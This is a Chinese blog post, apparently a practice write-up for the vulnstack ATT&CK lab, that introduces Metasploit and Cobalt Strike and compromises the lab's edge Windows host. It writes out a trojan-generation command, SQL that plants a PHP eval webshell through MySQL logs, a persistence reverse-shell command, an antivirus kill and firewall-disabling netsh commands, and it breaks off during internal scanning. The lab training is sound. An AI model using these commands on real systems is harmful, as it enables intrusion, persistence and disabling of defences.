<!DOCTYPE html>
<html lang="zh-Hans">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="ATT&amp;CK靶场(1)练习更多的应该是工具入门和思路学习？对windows的漏洞及其原理所知甚少 工具入门Meta Sploit Framework简称msf，应该是最常用的工具了。遇到可能的洞的攻击手法即为msf一把梭msf的常用模块为msfvenom和msfconsole，venom负责生成用于上线的木马，console则是主要交互手段">
<meta property="og:type" content="article">
<meta property="og:title" content="ATT&amp;CK靶场(1)练习">
<meta property="og:url" content="https://blog.z3ratu1.cn/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0.html">
<meta property="og:site_name" content="Z3ratu1&#39;s blog">
<meta property="og:description" content="ATT&amp;CK靶场(1)练习更多的应该是工具入门和思路学习？对windows的漏洞及其原理所知甚少 工具入门Meta Sploit Framework简称msf，应该是最常用的工具了。遇到可能的洞的攻击手法即为msf一把梭msf的常用模块为msfvenom和msfconsole，venom负责生成用于上线的木马，console则是主要交互手段">
<meta property="og:locale">
<meta property="og:image" content="https://blog.z3ratu1.cn/images/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220430153616790.png">
<meta property="og:image" content="https://blog.z3ratu1.cn/images/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220501160326834.png">
<meta property="og:image" content="https://blog.z3ratu1.cn/images/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220426164243942.png">
<meta property="og:image" content="https://blog.z3ratu1.cn/images/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220426200143080.png">
<meta property="og:image" content="https://blog.z3ratu1.cn/images/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220429172712073.png">
<meta property="og:image" content="https://blog.z3ratu1.cn/images/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220429210446446.png">
<meta property="og:image" content="https://blog.z3ratu1.cn/images/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220429210911146.png">
<meta property="article:published_time" content="2022-04-25T12:45:24.000Z">
<meta property="article:modified_time" content="2022-05-02T13:20:42.974Z">
<meta property="article:author" content="Z3ratu1">
<meta property="article:tag" content="Windows">
<meta property="article:tag" content="pentest">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog.z3ratu1.cn/images/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220430153616790.png">

<link rel="canonical" href="https://blog.z3ratu1.cn/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0.html">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-Hans'
  };
</script>

  <title>ATT&CK靶场(1)练习 | Z3ratu1's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Z3ratu1's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Welcome</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
      <meta itemprop="name" content="Z3ratu1">
      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Z3ratu1's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          ATT&CK靶场(1)练习
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-04-25 20:45:24" itemprop="dateCreated datePublished" datetime="2022-04-25T20:45:24+08:00">2022-04-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-05-02 21:20:42" itemprop="dateModified" datetime="2022-05-02T21:20:42+08:00">2022-05-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
                </span>
            </span>

          
            <span id="/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0.html" class="post-meta-item leancloud_visitors" data-flag-title="ATT&CK靶场(1)练习" title="阅读次数">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="ATT-amp-CK靶场-1-练习"><a href="#ATT-amp-CK靶场-1-练习" class="headerlink" title="ATT&amp;CK靶场(1)练习"></a>ATT&amp;CK靶场(1)练习</h1><p>更多的应该是工具入门和思路学习？对windows的漏洞及其原理所知甚少</p>
<h2 id="工具入门"><a href="#工具入门" class="headerlink" title="工具入门"></a>工具入门</h2><h3 id="Meta-Sploit-Framework"><a href="#Meta-Sploit-Framework" class="headerlink" title="Meta Sploit Framework"></a>Meta Sploit Framework</h3><p>简称msf，应该是最常用的工具了。遇到可能的洞的攻击手法即为msf一把梭<br>msf的常用模块为msfvenom和msfconsole，venom负责生成用于上线的木马，console则是主要交互手段</p>
<h4 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h4><p>用于生成木马<br>使用方式为</p>
<pre><code>msfvenom -p &lt;payload&gt; -o &lt;output&gt; -f &lt;type&gt; &lt;key&gt;=&lt;value&gt;
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o sysupdate.exe lport=10000
</code></pre>
<h4 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h4><h5 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h5><p>console中可以直接执行本机系统命令，也就是ifconfig之类的。在忘了ip的时候可以看一下。<br>对于监听的ip也可以使用对于网卡代替</p>
<blockquote>
<p>Metasploit tip: Adapter names can be used for IP params<br>set LHOST eth0</p>
</blockquote>
<p>试图攻击时使用<code>search</code>指令进行搜索可用的攻击模块<br><code>set unset</code>用于设定攻击选项<br><code>options</code>命令会展示当前模块下所有配置选项<br>使用<code>use &lt;module_name&gt;</code>进入对应模块<br><code>route print</code>展示路由转发<br><code>jobs</code>展示后台任务<br><code>kill</code>停止后台任务</p>
<h5 id="常用模块"><a href="#常用模块" class="headerlink" title="常用模块"></a>常用模块</h5><p>模块好多，我也不知道常用的有哪些。。。<br><code>exploit/mutil/handler</code>接受会话，应该是最常用的吧<br><code>post/windows/gather/arp_scanner</code>和<code>auxiliary/scanner/portscan/tcp</code>两个模块进行扫描，可以配合session的路由转发扫描内网<br><code>auxiliary/server/socks4a</code>和CS类似开启一个socks4的代理，但由于其本身可以使用session进行路由转发，若不需要给其他软件开代理则不需要使用。且socks4的代理不是很行</p>
<h5 id="会话操作"><a href="#会话操作" class="headerlink" title="会话操作"></a>会话操作</h5><p>msf将上线的机器称之为session<br>使用<code>sessions</code>列出当前所有会话，<code>sessions 1</code>进入会话1<br>需注意在会话中只能进行相应的会话操作，无法使用msfconsole中的命令，回到console请使用background，缩写bg，使用exit会导致断开连接<br>接受木马使用<code>exploit/mutil/handler</code>，选择payload类型。对于反向连接的木马启动时可以使用<code>run -j</code>将其作为一个后台任务运行。<br>需要注意payload类型与生成的木马类型需完全一致,<code>windows/x64/meterpreter/bind_tcp</code>无法接收<code>windows/meterpreter/bind_tcp</code>的会话</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220430153616790.png" alt="image-20220430153616790"></p>
<p>会话中也可以简单的使用upload download等语句上传下载文件，ps查看进程，ls查看目录等</p>
<p>会话中常使用msf自带的脚本进行攻击。msf会话有多种形式，最好用的即为meterpreter类型，可以执行msf的进一步操作，而其他的如普通shell则只能当一个shell使用</p>
<p>常用功能有get_local_subnets获取子网网段，getsystem提权到system，getuid查看当前权限，killav关闭杀软等<br>autoroute，可以以受害者为跳板进行内网转发。非常好用（就是有时候似乎不是很稳，玄学网络）</p>
<pre><code>run autoroute -s x.x.x.x/24
run autoroute -p
</code></pre>
<p>在msfconsole中输入<code>route print</code>也可以查看当前路由情况</p>
<p>同时还有两个维持权限的脚本（简单测试一下发现不好用。。。）<br><code>persistence</code>和<code>metsvc</code><br><code>run persistence -X -p 4444 -r 192.168.52.143</code><br>这个是改注册表项，<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code><br>创建一个反弹shell，-X指定后门在系统启动时启动，暂时没找到怎么创建一个正向shell，这里有一层内网不能直接弹出来，但是可以用之前的边缘机，直接在边缘机上起一个handler监听。msf支持将handler监听建立在被控制主机上</p>
<p><code>run metsvc</code>安装系统服务后门，暂时没找到有哪些参数可选，在系统启动时启动一个服务正向监听端口<br>按照官方的说法，这里连上去的payload应该是<code>windows/metsvc_bind_tcp</code>，但实际上我连的时候会各种dead。。。防火墙已经被关掉了来着。不知道什么原因</p>
<p>使用shell命令则打开一个cmd line，但是有中文乱码，使用<code>chcp 65001</code>切换编码（大概）就行</p>
<h3 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h3><p>简称CS，团队服务器，可以几个人连着一个服务器一起日，并且是图形化界面，可以点点点</p>
<p>这里似乎将每个控制的机器称为beacon，功能也很多，不过相较于msf能直接打一堆利用模块，CS更倾向于专注windows渗透，好像没有什么linux相关的功能。</p>
<h4 id="listener模块"><a href="#listener模块" class="headerlink" title="listener模块"></a>listener模块</h4><p>CS使用listener代替msf的handler。CS的listener种类较少，但较为通用，不会出现msf中payload和handler有一点点差别就连不上的情况。还提供了foreign handler用于会话转移。可以将CS中上线的机器连上msf进行进一步渗透<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cobaltstrike.com/blog/session-passing-from-cobalt-strike/">Session Passing from Cobalt Strike</a><br>msf应当使用符合类型的handler进行接收</p>
<h4 id="attack模块"><a href="#attack模块" class="headerlink" title="attack模块"></a>attack模块</h4><p>上线也需传一个马上去回连，在顶部栏<code>attack</code>处点击生成payload，需选择对应的listener接受。常用的有package下的后三个，以及web drive-by<br>package下的windows executeable是staged，这种马只是个加载器，需要后续加载其他功能（也许有一定的免杀能力），有(S)的是stageless的，就是打好包一把梭<br>payload generator处能产生各种语言的payload，在目标环境有命令执行和对应语言时能直接执行上线，谨防杀软</p>
<p>web drive-by用于进行一些web相关的交互，能建立文件服务器，构造钓鱼网站，或者说打一个script web deliver攻击，这个攻击也是命令行直接执行，做免杀处理<br>不过均需要目标机器能访问到CS服务器。内网环境下就不怎么好用了</p>
<h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><p>已上线的机器称为beacon，右键一个beacon，选择interact开始命令行交互<br>终端输入<code>help</code>获取帮助<br>cs为了隐蔽性，不建立长连接，而是beacon有一个睡眠时间，每隔多少时间向服务器发起一次回连，接受命令，并在下一次回连时返回结果。使用<code>sleep</code>命令控制beacon休眠时间，0则进入interactive模式。开启socks代理和远程桌面等功能均需要该选项</p>
<p>使用run或exec在目标机器上执行shell命令，exec不会返回结果，适合一些服务类型的命令</p>
<p><code>socks &lt;port&gt;</code>命令会在team server上开启一个端口转发，使用之前需使用sleep 0将beacon调至interactive模式。为socks4代理。并不是很实用感觉</p>
<p>access下面主要用dump hashes或者run mimikatz抓密码。当然前提是这个beacon的权限足够<br>explore下可以连远程桌面，进行文件系统交互之类的，端口扫描功能较为常用，可以进行端口扫描和主机发现<br>pivoting用于开启代理转发，就是socks命令。需再次注意开启的是socks4<br>spawn用于会话转移</p>
<h4 id="顶部栏"><a href="#顶部栏" class="headerlink" title="顶部栏"></a>顶部栏</h4><p>顶部栏中几个比较常用的功能有<br>查看网络拓扑图，查看beacon列表，查看targets，查看credentials</p>
<p>在targets中可以通过之前hashdump出来的凭据直接对域内机器发起攻击。jump选中一个凭据然后建立一个smb listener。一键上线</p>
<p>smb listener是正向监听的，不需要回连，也很适合这个内网环境。文章中一开始的拓扑逻辑即为边缘win7可出网反向链接，内网两台机子直接通过凭据登录进去smb正向连接</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a><br>大名鼎鼎的红日靶场环境，从这下。百度网盘十几个G，本来以为凉了，结果发现百度网盘调一下选项在开了允许p2p的情况下可以把速度提到2m&#x2F;s，勉强可接受。</p>
<p>网络拓扑就是win7是边缘机器，内网一个winserver08一个03，08域控<br>win7和攻击者联通，位于同一网段内且可出网，同时win7连接内网windows server，内网无法出网<br>到VMware的虚拟网络编辑器单独开一个网段指定网段且仅主机模式不通外网，也不要把物理机连接到该网段<br>然后win7和kali直接接VMware的nat网段好了，方便联网出网，也符合环境定位。也没什么问题</p>
<p>网络拓扑如图，贴一个CS一键打穿画出来的拓扑</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220501160326834.png" alt="image-20220501160326834"></p>
<p>但是有一点坑。。。好多服务不是开机自启动的，win7的服务需要手动进去开phpstudy。。。我就说怎么一开始没东西。windows server里的服务也要手动启动，但由于我不怎么会，后续没有打</p>
<h2 id="拿下边缘机"><a href="#拿下边缘机" class="headerlink" title="拿下边缘机"></a>拿下边缘机</h2><p>假定先拿到目标网段不知道具体位置，练习nmap使用<br>直接<code>nmap -h</code>就能看到绝大多数的可选项了</p>
<p>先<code>nmap -sP 192.168.68.0/24</code>用ping扫一轮。（直接ping扫有的究极防火墙可能扫不动。）<br>也可以直接扫的同时syn扫一轮常见端口<br><code>nmap -PS 192.168.68.0/24</code>，VMware的内网快的一笔，扫的飞快，然而，实际上我去扫别人的时候各种原因扫的龟慢</p>
<p>然后用高强度攻击指令梭<code>nmap -sV -A 192.168.68.140</code>，<br>-sV是尝试判断版本，-A是<code>Enable OS detection, version detection, script scanning, and traceroute</code>buff拉满，扫描速度就慢了下来</p>
<pre><code>PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)
|_http-title: phpStudy \xE6\x8E\xA2\xE9\x92\x88 2014 
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45
3306/tcp open  mysql   MySQL (unauthorized)
</code></pre>
<p>结果如上，直接指出了服务器的版本，mysql也对公网开放，后面跟了一个unauthorized，意思是未授权吗？实际上去连接的时候却报错<code>Host &#39;192.168.68.139&#39; is not allowed to connect to this MySQL server</code>，看这个样子是限制了可访问的ip的</p>
<p>看一眼web服务，是一个14年的phpstudy搭的PHP探针。有一个令人在意的功能，为mysql数据库连接测试，摸出来rouge MySQL trytry。能连上，但似乎并没有允许load local data，读不了。并且读文件也做不到rce，ctf思路有点重，百度这个14年的PHP探针得到的结果全都是配套的phpmyadmin弱密码rce（虽然这里确实是这么个做法），先扫描器开梭</p>
<p>简单的看了一下kali下的工具，结果都要提供字典。不如用御剑或者dirsearch自带字典开梭（然后把dirsearch的字典放进去了跑起来也报错。。。感觉不如。。。dirsearch。。。稳定性）</p>
<p>只能扫出来一个phpmyadmin（扫出来beifen.rar的字典真不是一般人）弱密码root&#x2F;root进入。简单使用一下，有一个newyxcms数据库。里面有一个yx admin数据，密码md5拿到，cmd5搜一下收费记录，pmd5能搜出来，<code>949ba59abbe56e05</code><br>执行<code>SELECT @@secure_file_priv</code>查看文件写入权限，为null，不给写。</p>
<h3 id="突破secure-file-priv写文件"><a href="#突破secure-file-priv写文件" class="headerlink" title="突破secure_file_priv写文件"></a>突破secure_file_priv写文件</h3><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html">Mysql写文件</a><br>在能够堆叠注入或是直接执行SQL语句时可以通过日志文件的方式进行数据的写入，虽然会有一些杂数据，但仅仅是PHP马的话还是没有问题的</p>
<h4 id="general-log写入"><a href="#general-log写入" class="headerlink" title="general_log写入"></a>general_log写入</h4><p>这个是每一个查询都会写入，任意导致文件被写的很大，PHP对文件存在大小限制，过大则无法解析。故不常用，或者堆叠用完记得关。最好也把一开始的路径记下来还原回去</p>
<pre class=" language-mysql"><code class="language-mysql">set global general_log = on;
set global general_log_file = 'C:/phpStudy/WWW/info.php';
select '<?php phpinfo();?>';
set global general_log = off;
</code></pre>
<p>由于部署的PHP探针暴露了网站根目录位置，此处直接写入</p>
<h4 id="long-query-time慢日志写入"><a href="#long-query-time慢日志写入" class="headerlink" title="long_query_time慢日志写入"></a>long_query_time慢日志写入</h4><p>前段时间学习过，MySQL对查询时间超出该变量限制的语句进行记录，默认为10s，正常运行很少触发该情形，故日志文件大小可控。（其实默认是关了慢日志的）</p>
<pre class=" language-mysql"><code class="language-mysql">show variables like '%slow_query_log%';
set global slow_query_log=1;
set global slow_query_log_file='C:/phpStudy/WWW/shell.php';
select '<?php @eval($_POST[abc]);?>' or sleep(11);    
</code></pre>
<p>这里有一个巨坑。。。之前应该是为了下插件给蚁剑开了代理，导致我局域网实际上这个内网访问不到一直连不上。。。排查了半天</p>
<h3 id="yxcms弱密码进入后台"><a href="#yxcms弱密码进入后台" class="headerlink" title="yxcms弱密码进入后台"></a>yxcms弱密码进入后台</h3><p>之前提到过在phpmyadmin处已经拿了个shell了，也顺手拿到了密码的hash<br>这下来打一下这个yxcms（这个cms本身需要扫到yxcms这个目录？）因为打开时的默认页面是个PHP探针来着。然而这个hash不能直接打，套的有东西。并且这个太默认了一点，上来都给密码送出来了。。。感觉再垃圾的站应该也不会垃圾到这个程度了</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220426164243942.png" alt="image-20220426164243942"></p>
<p>甚至告诉了后台入口，这里直接点页面上的登录按钮是有一个<code>/yxcms/index.php?r=member/index/login</code>的路由来处理的，将member改为admin进行管理员登录确实是一个可行思路</p>
<p>后台rce的话理论上来说是比较简单的，WordPress这种成熟框架到了后台也是任意rce的，毕竟谁防管理员呢？这里找一下可能的危险操作</p>
<p>最显眼的就是模板编辑了。选一个看起来比较通用的index_index.php，加一个一句话木马打通<br>然后看一下其他功能，有一个数据库操作，可以进行和phpmyadmin时一样的操作，还有一个应用导入，允许上传一个特定格式的安装包进行应用安装，也许研究一下格式可以传一个马上去</p>
<h2 id="渗透环节"><a href="#渗透环节" class="headerlink" title="渗透环节"></a>渗透环节</h2><p>打一波cs玩一下捏<br>其实应该想看一下用户权限和域相关情况是不是域之类的（这里我也不知道他是怎么部署的环境，但是我开机的时候直接是域管的登录界面，我就直接登录域管了，所以也直接是域管权限。。。）</p>
<pre><code>net view /domain
net user /domain
whoami /all
</code></pre>
<p>第一个命令在蚁剑的虚拟终端上跑不出来结果。蚁剑的虚拟终端在执行某些命令以及使用管道符等时有时候有问题，不知道他具体是怎么解析命令的，也许到这一步应该直接转战cs或者msf<br>whoami &#x2F;all可以看用户权限，直接看到本地管理+域管双重无敌权限</p>
<p>上线之前先看一下有没有杀软之类的，因为有的话我就不会免杀了嘻嘻（也许能在蚁剑命令行直接关了杀软防火墙？）<br>windows直接<code>tasklist /SVC</code>看任务管理器，无杀软（说起来好像windows defender就算存在也找不到？不是很懂）。CS启动</p>
<p>先注册一个listener监听端口收shell，然后在Attacks里面直接生成一个Windows Executeable，因为没有杀软直接stageless一把梭。用蚁剑传到目标服务器后梭。然后发现蚁剑执行beacon.exe半天没有反应，回到网页上的webshell去直接执行，也没有用捏</p>
<p>进虚拟机排查原因，然后发现被究极防火墙拦了。。。这咋整啊</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220426200143080.png" alt="image-20220426200143080"></p>
<p>翻出来一个手册<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.mi1k7ea.com/2020/02/27/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">内网信息收集之本机信息收集</a></p>
<p>但是我这个号是究极管理员来着，可以放行这个软件<br><code>netsh firewall add allowedprogram c:\phpstudy\www\beacon.exe &quot;exploit&quot; enable</code><br>这里有一个坑。。。描述字符串一定要用双引号包裹，用单引号包裹打了半天和我syntax error</p>
<p>甚至大力出奇迹，直接关掉防火墙<br>Windows Server 2003及之前的版本：<br><code>netsh firewall set opmode disable</code><br>Windows Server 2003之后的版本：<br><code>netsh advfirewall set allprofiles state off</code></p>
<p>成功上线，一开始生成的是32位的payload，一直没打通，然后生成了一个64位的就又打通了？理论上来说不应该64位是兼容32位的吗，总之这种东西玄学多多，多试几下</p>
<p>接下来应该想办法往内网打了，先部署一下nmap吧？</p>
<p>其实直接<code>net user /domain</code>,<code>net time /domain</code>之类的操作能直接看到域控名字，再ping一下就有ip了，或者nslookup反查，不过要发现域内全部主机的话，还是得扫的</p>
<h3 id="内网代理-amp-端口扫描"><a href="#内网代理-amp-端口扫描" class="headerlink" title="内网代理&amp;端口扫描"></a>内网代理&amp;端口扫描</h3><p>在CS终端中键入<code>socks &lt;port&gt;</code>以开启一个socks代理，使用之前需要先sleep 0将beacon调成实时交互的，然后在kali上使用proxychains工具进行流量转发<br>在proxychains profile的最后一行添加上CS服务器的IP和开启转发的端口即可</p>
<pre><code>beacon&gt; sleep 0
[*] Tasked beacon to become interactive
[+] host called home, sent: 16 bytes
beacon&gt; socks 50000
[+] started SOCKS4a server on: 50000
[+] host called home, sent: 16 bytes
</code></pre>
<p><code>proxychains nmap -sT -Pn 192.168.52.0/24</code><br>因为CS开的是socks4的代理，只能转发tcp流量，所以需要添加-sT参数使用TCP扫描，而-Pn则是禁用ping</p>
<p>这里需要注意的是CS的socks命令是在CS服务器上开启一个代理端口，而不是被种了马的机器。。。。扫描效率奇低无比</p>
<p>直接用CS自带的扫描试试。不加端口就是主机探测。</p>
<pre><code>beacon&gt; portscan 192.168.52.0-192.168.52.255  arp 1024
[*] Tasked beacon to scan ports  on 192.168.52.0-192.168.52.255
